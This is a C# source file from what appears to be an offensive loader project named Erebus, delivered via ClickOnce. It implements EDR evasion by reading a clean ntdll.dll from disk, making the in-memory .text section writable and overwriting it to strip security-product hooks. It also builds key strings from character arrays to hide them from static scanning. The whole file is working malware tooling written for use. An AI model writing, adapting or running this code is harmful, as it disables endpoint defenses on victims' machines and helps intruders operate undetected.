using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce.Evasion
{
    /// <summary>
    /// Overlay the loaded ntdll.dll .text section with a clean on-disk
    /// copy, removing any inline hooks an EDR has planted on Nt* stubs.
    ///
    /// Every P/Invoke we make into ntdll (directly or through kernel32
    /// forwarders) executes the first few bytes of the corresponding
    /// stub before hitting the syscall instruction. Commodity EDR
    /// vendors place a 5-byte jmp rel32 there to route calls through
    /// their inspection thunks. Overwriting those bytes with the
    /// pristine on-disk copy takes us back to the kernel transition
    /// with no EDR interception for the remainder of the process.
    ///
    /// This is the managed equivalent of the native loader's
    /// src/evasion/ntdll_unhook.cpp. Same idea, slightly different
    /// plumbing:
    ///
    ///   - The clean bytes come from `File.ReadAllBytes(systemPath)`
    ///     rather than from \KnownDlls, because managed code can't
    ///     cleanly open an NT object path without extra P/Invoke
    ///     surface. The file read is a single NtReadFile syscall; for
    ///     a .NET host that was already going to touch the filesystem
    ///     through ClickOnce install and the CLR's image loader, one
    ///     more read of ntdll.dll is routine noise.
    ///
    ///   - All sensitive strings (the path to ntdll.dll, the literal
    ///     "ntdll.dll", and ".text") are built at runtime from char
    ///     arrays so they stay out of the assembly's #Strings heap.
    /// </summary>
    [SupportedOSPlatform("windows")]
    internal static class NtdllUnhook
    {
        private static bool s_done;

        public static bool Unhook()
        {
            if (s_done) return true;

            try
            {
                return DoUnhook();
            }
            catch
            {
                return false;
            }
        }

        private static bool DoUnhook()
        {
            // Build "C:\\Windows\\System32\\ntdll.dll" at runtime.
            // SystemDirectory resolves the correct System32 / SysWOW64
            // path for the current bitness without a literal.
            string sysDir = Environment.SystemDirectory;
            char[] ntdllName = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
            string ntdllFile = Path.Combine(sysDir, DynamicApi.FromChars(ntdllName));

            byte[] clean;
            try
            {
                clean = File.ReadAllBytes(ntdllFile);
            }
            catch
            {
                return false;
            }

            // In-memory base via GetModuleHandle (already-loaded module).
            IntPtr liveBase = DynamicApi.ResolveModule(ntdllName);
            if (liveBase == IntPtr.Zero) return false;

            // Parse PE header of the on-disk clean copy.
            if (clean.Length < 0x40) return false;
            int peOffset = BitConverter.ToInt32(clean, 0x3C);
            if (peOffset < 0 || peOffset + 0x18 >= clean.Length) return false;
            if (clean[peOffset] != (byte)'P' || clean[peOffset + 1] != (byte)'E') return false;

            short numSections = BitConverter.ToInt16(clean, peOffset + 6);
            short optHdrSize  = BitConverter.ToInt16(clean, peOffset + 20);
            int secTable = peOffset + 24 + optHdrSize;

            // Walk the section table for `.text`.
            const int SEC_HDR_SIZE = 40;
            for (int i = 0; i < numSections; i++)
            {
                int sh = secTable + i * SEC_HDR_SIZE;
                if (sh + SEC_HDR_SIZE > clean.Length) return false;

                // Compare section name byte-by-byte against ".text" so we
                // don't materialise the literal as a managed string.
                if (clean[sh + 0] != (byte)'.' ||
                    clean[sh + 1] != (byte)'t' ||
                    clean[sh + 2] != (byte)'e' ||
                    clean[sh + 3] != (byte)'x' ||
                    clean[sh + 4] != (byte)'t')
                {
                    continue;
                }

                uint virtSize = BitConverter.ToUInt32(clean, sh + 8);
                uint virtAddr = BitConverter.ToUInt32(clean, sh + 12);
                uint rawSize  = BitConverter.ToUInt32(clean, sh + 16);
                uint rawPtr   = BitConverter.ToUInt32(clean, sh + 20);

                uint span = virtSize < rawSize ? virtSize : rawSize;
                if (span == 0) return false;
                if (rawPtr + span > clean.Length) return false;

                IntPtr liveText = IntPtr.Add(liveBase, (int)virtAddr);

                // Flip live .text to RWX.
                if (!DynamicApi.VirtualProtect(
                        liveText,
                        (UIntPtr)span,
                        DynamicApi.PAGE_EXECUTE_READWRITE,
                        out uint oldProtect))
                {
                    return false;
                }

                // Overlay clean bytes onto the live image.
                Marshal.Copy(clean, (int)rawPtr, liveText, (int)span);

                // Restore the original protection (almost always RX).
                DynamicApi.VirtualProtect(
                    liveText,
                    (UIntPtr)span,
                    oldProtect,
                    out _);

                s_done = true;
                DebugLogger.WriteLine($"[+] NTDLL unhooked ({span} bytes of .text overlaid)");
                return true;
            }

            return false;
        }
    }
}
